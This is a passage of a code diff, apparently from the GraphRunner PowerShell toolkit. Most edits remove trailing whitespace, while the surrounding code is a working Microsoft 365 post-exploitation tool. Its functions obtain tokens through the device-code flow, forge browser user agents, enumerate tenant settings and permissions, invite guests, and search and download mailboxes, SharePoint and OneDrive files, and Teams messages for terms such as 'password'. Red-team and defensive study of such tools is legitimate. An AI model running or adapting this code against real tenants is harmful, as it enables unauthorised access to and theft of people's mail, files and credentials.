-    .PARAMETER EmailAddress
-    
-        The email address of the user you want to invite
-        
-    .PARAMETER RedirectUrl 
-    
-        A redirect url that you want to redirect the guest to upon accepting the invite. Leave blank to use the default
-        
-    .PARAMETER SendInvitationMessage
-    
-        Option to send an email to the invited user or not
-        
-    .PARAMETER CustomMessageBody
-    
-        Change the message body sent in the invite 
 
-    .EXAMPLES      
-        
+        The name you want displayed in the Azure directory for the user (ex. "Beau Bullock")
+
+    .PARAMETER EmailAddress
+
+        The email address of the user you want to invite
+
+    .PARAMETER RedirectUrl
+
+        A redirect url that you want to redirect the guest to upon accepting the invite. Leave blank to use the default
+
+    .PARAMETER SendInvitationMessage
+
+        Option to send an email to the invited user or not
+
+    .PARAMETER CustomMessageBody
+
+        Change the message body sent in the invite
+
+    .EXAMPLES
+
         C:\PS> Invoke-InviteGuest -Tokens $tokens -DisplayName "Lord Voldemort" -EmailAddress "iamlordvoldemort@31337schoolofhackingandwizardry.com"
 #>
 
@@ -4753,11 +4863,11 @@ function Invoke-InviteGuest{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -4771,8 +4881,8 @@ function Invoke-InviteGuest{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
     $headers = @{"Authorization" = "Bearer $accesstoken"}
     # Construct the Graph API endpoint
     $graphApiUrl = "https://graph.microsoft.com/v1.0"
@@ -5006,15 +5116,15 @@ function Invoke-GraphRecon{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
            PowerShell module to perform general recon via the Azure AD Graph API.
 
         .PARAMETER PermissionEnum
-           
+
             Enumerates individual permissions for the current user.
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Invoke-GraphRecon -Tokens $tokens -PermissionEnum
     #>
 
@@ -5047,8 +5157,8 @@ function Invoke-GraphRecon{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -5057,7 +5167,7 @@ function Invoke-GraphRecon{
         if(!$GraphRun){
             Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
         }
-        
+
         # Use the existing tokens directly since they're already scoped to graph.microsoft.com
         $access_token = $tokens.access_token
     }
@@ -5085,7 +5195,7 @@ function Invoke-GraphRecon{
         $continue = "authorization_pending"
         while($continue)
         {
-    
+
             $body=@{
                 "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                 "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
@@ -5119,16 +5229,16 @@ function Invoke-GraphRecon{
     try {
         # Get current user information first to test authentication
         $me = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers -Method Get
-        
+
         # Try to get organization info - this might fail due to permissions
         try {
             $org = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/organization" -Headers $headers -Method Get
             $org = $org.value[0]
-            
+
             if(!$GraphRun){
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
                 Write-Host -ForegroundColor Yellow "Main Contact Info"
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
             }
             Write-Output "Display Name: $($org.displayName)"
             Write-Output "Street: $($org.street)"
@@ -5140,35 +5250,35 @@ function Invoke-GraphRecon{
             Write-Output "Telephone Number: $($org.telephoneNumber)"
         } catch {
             Write-Host -ForegroundColor Yellow "[*] Organization endpoint not accessible, trying alternative methods..."
-            
+
             # Try to get tenant info from user's context
             $tenantId = $me.userPrincipalName.Split('@')[1]
             Write-Output "Tenant Domain: $tenantId"
             Write-Output "User Principal Name: $($me.userPrincipalName)"
             Write-Output "Display Name: $($me.displayName)"
         }
-        
+
         # Try to get domains information
         try {
             $domains = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/domains" -Headers $headers -Method Get
             $initialDomain = $domains.value | Where-Object { $_.isInitial } | Select-Object -First 1 -ExpandProperty id
-            
+
             if(!$GraphRun){
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
                 Write-Host -ForegroundColor Yellow "Directory Sync Settings"
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
             }
             Write-Output "Initial Domain: $initialDomain"
-            
+
             # Get directory sync information from organization
             $syncEnabled = $null
             $syncStatus = $null
-            
+
             if ($org) {
                 $syncEnabled = $org.onPremisesSyncEnabled
                 $syncStatus = $org.onPremisesDirectorySynchronizationEnabled
             }
-            
+
             # If organization endpoint didn't provide sync info, try alternative
             if ($syncEnabled -eq $null) {
                 try {
@@ -5182,7 +5292,7 @@ function Invoke-GraphRecon{
                     # Continue with user-based detection
                 }
             }
-            
+
             # Display sync information
             if ($syncEnabled -ne $null) {
                 Write-Output "Directory Sync Enabled: $syncEnabled"
@@ -5190,7 +5300,7 @@ function Invoke-GraphRecon{
             if ($syncStatus -ne $null) {
                 Write-Output "Directory Sync Status: $syncStatus"
             }
-            
+
             # Check for actual synced users to verify sync status
             try {
                 $users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=10&`$select=onPremisesSyncEnabled,onPremisesDomainName,onPremisesSamAccountName" -Headers $headers -Method Get
@@ -5204,7 +5314,7 @@ function Invoke-GraphRecon{
             } catch {
                 Write-Output "Directory Sync Active: Unable to determine"
             }
-            
+
             # Try to get additional sync details from beta endpoint
             try {
                 $dirSyncStatus = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/directorySync" -Headers $headers -Method Get
@@ -5217,20 +5327,20 @@ function Invoke-GraphRecon{
             } catch {
                 # Beta endpoint not available, skip
             }
-            
+
         } catch {
             Write-Host -ForegroundColor Yellow "[*] Domains endpoint not accessible"
         }
-        
+
         # Try to get authorization policy for user permissions
         try {
             $authpolicy = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/policies/authorizationPolicy" -Headers $headers -Method Get
             $authpolicy = $authpolicy.value[0]
-            
+
             if(!$GraphRun){
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
                 Write-Host -ForegroundColor Yellow "User Settings"
-                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow ("=" * 80)
             }
             Write-Output "Users Can Consent to Apps: $($authpolicy.defaultUserRolePermissions.allowedToCreateApps)"
             Write-Output "Users Can Read Other Users: $($authpolicy.defaultUserRolePermissions.allowedToReadOtherUsers)"
@@ -5239,9 +5349,9 @@ function Invoke-GraphRecon{
         } catch {
             Write-Host -ForegroundColor Yellow "[*] Authorization policy endpoint not accessible"
         }
-        
+
         if(!$GraphRun){
-            Write-Host -ForegroundColor Yellow ("=" * 80) 
+            Write-Host -ForegroundColor Yellow ("=" * 80)
         }
     } catch {
         Write-Host -ForegroundColor Red "Error with Microsoft Graph API calls: $_"
@@ -5251,7 +5361,7 @@ function Invoke-GraphRecon{
     # Variables needed for permission enumeration
     $accesstoken = $tokens.access_token
     $refreshtoken = $tokens.refresh_token
-        
+
     $graphApiEndpoint = "https://graph.microsoft.com/v1.0/me"
     $estimateAccessEndpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"
     $authpolicyEndpoint = "https://graph.microsoft.com/beta/policies/authorizationPolicy"
@@ -5265,7 +5375,7 @@ function Invoke-GraphRecon{
         $authpolicy = Invoke-RestMethod -Uri $authpolicyEndpoint -Headers $headers -Method Get
         if(!$GraphRun){
         Write-Host -ForegroundColor Yellow "Authorization Policy Info"
-            Write-Host -ForegroundColor Yellow ("=" * 80) 
+            Write-Host -ForegroundColor Yellow ("=" * 80)
         }
         # Display the extracted data
         Write-Output ("Allowed to create app registrations (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToCreateApps)
@@ -5283,7 +5393,7 @@ function Invoke-GraphRecon{
         if ($authpolicy.value.guestUserRoleId -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970"){Write-Output "Guest User Policy: Guest users have the same access as members (most inclusive)"}
         if ($authpolicy.value.guestUserRoleId -eq "10dae51f-b6af-4016-8d66-8c2a99b929b3"){Write-Output "Guest User Policy: Guest users have limited access to properties and memberships of directory objects"}
         if ($authpolicy.value.guestUserRoleId -eq "2af84b1e-32c8-42b7-82bc-daa82404023b"){Write-Output "Guest User Policy: Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)"}
-        
+
     }
     catch {
         Write-Host -ForegroundColor Red "Error fetching user information: $_"
@@ -5291,7 +5401,7 @@ function Invoke-GraphRecon{
 
 
     if(!$GraphRun){
-        Write-Host -ForegroundColor Yellow ("=" * 80) 
+        Write-Host -ForegroundColor Yellow ("=" * 80)
     }
 
     if($PermissionEnum){
@@ -5693,7 +5803,7 @@ function Invoke-GraphRecon{
             $allowedActions = @()
             $conditionalActions = @()
             $otherActions = @()
-    
+
 
             for ($i = 0; $i -lt $batchCount; $i++) {
                 $start = $i * $batchSize
@@ -5721,7 +5831,7 @@ function Invoke-GraphRecon{
                         if ($accessdecision -eq "Allowed") {
                             $description = $resourceActions[$resourceAction]
                             $allowedActions += "$description : $accessdecision"
-                        } 
+                        }
                         elseif($accessdecision -eq "Conditional"){
                             $description = $resourceActions[$resourceAction]
                             $conditionalActions += "$description : $accessdecision"
@@ -5738,7 +5848,7 @@ function Invoke-GraphRecon{
 
             # Output "Allowed" actions first, followed by other actions
             Write-Host -ForegroundColor Green "[Allowed Actions]:"
-            
+
             foreach ($action in $allowedActions) {
                 Write-Output $action
             }
@@ -5750,7 +5860,7 @@ function Invoke-GraphRecon{
         } catch {
             Write-Host -ForegroundColor Red "Error fetching user information: $_"
         }
-    
+
     }
 }
 
@@ -5799,11 +5909,11 @@ function Invoke-SearchUserAttributes {
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     } else {
         # Login
-        Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+        Write-Host -ForegroundColor yellow "[*] First, you need to login."
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while ($auth -notlike "Yes") {
             Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-            $answer = Read-Host 
+            $answer = Read-Host
             $answer = $answer.ToLower()
             if ($answer -eq "yes" -or $answer -eq "y") {
                 Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -5817,8 +5927,8 @@ function Invoke-SearchUserAttributes {
             }
         }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
     $headers = @{
         Authorization = "Bearer $accessToken"
@@ -5887,15 +5997,15 @@ Function Invoke-SearchMailbox{
     <#
     .SYNOPSIS
 
-        This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.    
+        This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-       This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox. 
+
+       This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.
 
     .PARAMETER Tokens
 
@@ -5918,7 +6028,7 @@ Function Invoke-SearchMailbox{
         Enables paging to page through results
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
         -----------
         This will search through the current user's mailbox for the term password.
@@ -5953,11 +6063,11 @@ Function Invoke-SearchMailbox{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -5971,8 +6081,8 @@ Function Invoke-SearchMailbox{
                 }
             }
     }
-    $access_token = $tokens.access_token   
-    [string]$refresh_token = $tokens.refresh_token 
+    $access_token = $tokens.access_token
+    [string]$refresh_token = $tokens.refresh_token
 
     $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"
 
@@ -6000,7 +6110,7 @@ Function Invoke-SearchMailbox{
 
     # Perform the HTTP POST request to search emails
     $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
-    
+
     # Process the response and display the summary
     $total = $response.value[0].hitsContainers[0].total
     if(!$GraphRun){
@@ -6011,9 +6121,9 @@ Function Invoke-SearchMailbox{
             Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
         }
     }
-        
+
     if ($total -eq 0){return}
-        
+
         $moreresults = "True"
         while ($moreresults -like "True") {
             $moreresults = $response.value[0].hitsContainers[0].moreResultsAvailable
@@ -6039,7 +6149,7 @@ Function Invoke-SearchMailbox{
             if(!$GraphRun){
 
             Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
-            Write-Host ("=" * 80) 
+            Write-Host ("=" * 80)
             }
             }
             if($OutFile){
@@ -6052,7 +6162,7 @@ Function Invoke-SearchMailbox{
             if(!$GraphRun){
             while($download -notlike "Yes"){
                 Write-Host -ForegroundColor Cyan "[*] Do you want to download these emails and their attachments? (Yes/No)"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Downloading messages..."
@@ -6087,7 +6197,7 @@ Function Invoke-SearchMailbox{
 
                 # Remove special characters and replace spaces with underscores
                 $cleanedSubject = $subject -replace '[^\w\s]', '' -replace '\s', '_'
-        
+
 
                 # Fetch email details using the message ID
                 Write-Host "[*] Downloading $cleanedSubject"
@@ -6111,7 +6221,7 @@ Function Invoke-SearchMailbox{
                         Write-Host "[***] Downloading attachment $attachmentFileName"
                         $attachmentContentBytes | Set-Content -Path "$folderName\$attachmentFileName" -Encoding Byte
                         }
-        
+
                 }
                 }
                 # Export the email file names to filelist.json
@@ -6198,7 +6308,7 @@ Function Invoke-SearchMailbox{
                         <strong>Preview:</strong> `${email.bodyPreview}<br>
                         <strong>Attachments:</strong> `${email.hasAttachments ? 'Yes' : 'No'}<br>
                     ``;
-                    
+
                     emailSummaryDiv.addEventListener('click', () => loadFullEmail(email));
                     emailList.appendChild(emailSummaryDiv);
                 });
@@ -6214,15 +6324,15 @@ Function Invoke-SearchMailbox{
 </body>
 </html>
 "@
-        
+
             $htmlContent | Out-File -FilePath "$folderName\emailviewer.html" -Encoding UTF8
             Write-Host -ForegroundColor yellow "[*] Emails and attachments have been exported to the folder $folderName."
             Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
             Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $folderName directory and then navigate to http://localhost:8000/emailviewer.html"
         }
         }
-        
-        
+
+
         If(!$PageResults){
             $moreresults = "False"
         }
@@ -6232,14 +6342,14 @@ Function Invoke-SearchMailbox{
             $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
         }
     }
-        
+
 }
 
 
 
 function Invoke-HTTPServer{
     <#
-    .SYNOPSIS 
+    .SYNOPSIS
     A basic web server to use for accessing the emailviewer.html file output from Invoke-SearchMailbox
     #>
     param(
@@ -6281,11 +6391,11 @@ function Get-SharePointSiteURLs{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
            Uses the Graph Search API to find SharePoint site URLs
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Get-SharePointSiteURLs -Tokens $tokens
     #>
 
@@ -6300,11 +6410,11 @@ function Get-SharePointSiteURLs{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -6318,8 +6428,8 @@ function Get-SharePointSiteURLs{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
 
     # Define the base URL and search URL
@@ -6363,7 +6473,7 @@ function Get-SharePointSiteURLs{
         foreach($hit in $newDrives.hitsContainers){
             $siteId = $hit.resource.parentReference.siteId
             $webUrl = $hit.resource.webUrl
-        
+
             # Filter out duplicates based on drive ID
             if ($siteId -notin $seenDriveIds){
                 $sharepointDrives += $hit
@@ -6371,7 +6481,7 @@ function Get-SharePointSiteURLs{
             else{
                 $seenDriveIds += $hit
             }
-        
+
         }
 
     $sorted = $sharepointDrives.hits | Sort-Object {$_.resource.webUrl}
@@ -6390,14 +6500,14 @@ function Invoke-SearchSharePointAndOneDrive{
     <#
     .SYNOPSIS
 
-        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.   
+        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.
 
     .PARAMETER Tokens
@@ -6421,7 +6531,7 @@ function Invoke-SearchSharePointAndOneDrive{
         Using paging it will return all possible results for a search term
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
         -----------
         This will search through the all SharePoint and OneDrive drives accessible to the current user for the term password.
@@ -6465,8 +6575,8 @@ function Invoke-SearchSharePointAndOneDrive{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -6479,11 +6589,11 @@ function Invoke-SearchSharePointAndOneDrive{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -6497,8 +6607,8 @@ function Invoke-SearchSharePointAndOneDrive{
                 }
             }
     }
-    $access_token = $tokens.access_token   
-    [string]$refresh_token = $tokens.refresh_token 
+    $access_token = $tokens.access_token
+    [string]$refresh_token = $tokens.refresh_token
 
     $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"
 
@@ -6540,7 +6650,7 @@ function Invoke-SearchSharePointAndOneDrive{
     }
     if ([int]$total -gt 0){
         $itemnumber = 0
-       
+
         while ($itemnumber -lt $total) {
             $resultsList = @()
             foreach ($hit in $response.value[0].hitsContainers[0].hits) {
@@ -6576,7 +6686,7 @@ function Invoke-SearchSharePointAndOneDrive{
                 "Preview" = $summary
                 "Last Modified Date" = $LastModifiedDate
             }
-            
+
             $resultarray += New-Object PSObject -Property $resultInfo
             $resultsList += New-Object PSObject -Property $LogInfo
             if(!$ReportOnly){
@@ -6588,7 +6698,7 @@ function Invoke-SearchSharePointAndOneDrive{
                 Write-Host "Size: $sizeFormatted"
                 Write-Host "File Preview: $summary"
                 Write-Host "DriveID & Item ID: $driveid\:$itemid"
-                Write-Host ("=" * 80) 
+                Write-Host ("=" * 80)
                 }
             $itemnumber++
             }
@@ -6642,7 +6752,7 @@ function Invoke-SearchSharePointAndOneDrive{
                 $answer = $answer.ToLower()
 
                 if ($answer -eq "yes" -or $answer -eq "y") {
-                    $done = "yes"  
+                    $done = "yes"
                     Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                     $resulttodownload = Read-Host
                     $resultstodl = $resulttodownload.split(",")
@@ -6667,7 +6777,7 @@ function Invoke-SearchSharePointAndOneDrive{
                 }
             }
         }
-        }    
+        }
     }
 }
 
@@ -6675,14 +6785,14 @@ function Invoke-DriveFileDownload{
     <#
         .SYNOPSIS
 
-        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.   
+        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.
 
     .PARAMETER Tokens
@@ -6698,7 +6808,7 @@ function Invoke-DriveFileDownload{
         The filename you want to download the file to
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-DriveFileDownload -Tokens $tokens -FileName "Passwords.docx" -DriveItemIDs "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"
         -----------
         This will download a single file from the drive specified.
@@ -6730,8 +6840,8 @@ function Invoke-DriveFileDownload{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -6752,14 +6862,14 @@ function Invoke-SearchTeams{
     <#
         .SYNOPSIS
 
-        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.   
+        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.
 
     .PARAMETER Tokens
@@ -6779,7 +6889,7 @@ function Invoke-SearchTeams{
         File to output the results of the search to
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-SearchTeams -Tokens $tokens -SearchTerm "password" -ResultSize 100
         -----------
         This searches all Teams messages in all channels visible to the current user for the term password.
@@ -6812,11 +6922,11 @@ function Invoke-SearchTeams{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -6830,8 +6940,8 @@ function Invoke-SearchTeams{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshtoken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshtoken = $tokens.refresh_token
 
 
     # First we need to refresh for Teams message access
@@ -6861,7 +6971,7 @@ function Invoke-SearchTeams{
     $access_token = $response.access_token
     $uri = "https://substrate.office.com/search/api/v2/query"
     $headers = @{
-        "Authorization" = "Bearer $access_token"  
+        "Authorization" = "Bearer $access_token"
         "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"
         "Content-Type" = "application/json"
     }
@@ -6980,7 +7090,7 @@ function Invoke-SearchTeams{
             "Summary" = $Summary
             "Body" = $response.body.content
         }
-            
+
         $resultsList += New-Object PSObject -Property $LogInfo
     }
     if($OutFile){
@@ -6997,7 +7107,7 @@ function Invoke-CreateCalendarEvent {
     <#
         .SYNOPSIS
 
-        This module creates a new calendar event using the Microsoft Graph API. 
+        This module creates a new calendar event using the Microsoft Graph API.
         Author: Curtis Ringwald (@C0axx)
         License: MIT
         Required Dependencies: None
@@ -7037,7 +7147,7 @@ function Invoke-CreateCalendarEvent {
         $Attendees = @("participant1@example.com", "participant2@example.com")
         Invoke-CreateCalendarEvent -Tokens $Tokens -Subject $Subject -Start $Start -End $End -Body $Body -Location $Location -TimeZone $TimeZone -Attendees $Attendees
         #>
-    
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$true)]
@@ -7124,14 +7234,14 @@ function Invoke-GraphRunner{
     <#
     .SYNOPSIS
 
-        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.  
+        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.
 
     .PARAMETER Tokens
@@ -7236,11 +7346,11 @@ function Invoke-GraphRunner{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -7254,9 +7364,9 @@ function Invoke-GraphRunner{
                 }
             }
     }
-    $access_token = $tokens.access_token   
-    [string]$refresh_token = $tokens.refresh_token 
-    
+    $access_token = $tokens.access_token
+    [string]$refresh_token = $tokens.refresh_token
+
     $detectors = Get-Content $DetectorFile
     $detector = $detectors |ConvertFrom-Json
 
@@ -7520,7 +7630,7 @@ function Invoke-ForgeUserAgent
             {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
             }
-            else 
+            else
             {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
             }
@@ -7543,7 +7653,7 @@ function Invoke-ForgeUserAgent
             {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
             }
-            else 
+            else
             {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
             }
@@ -7566,7 +7676,7 @@ function Invoke-ForgeUserAgent
             {
                 $UserAgent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
             }
-            else 
+            else
             {
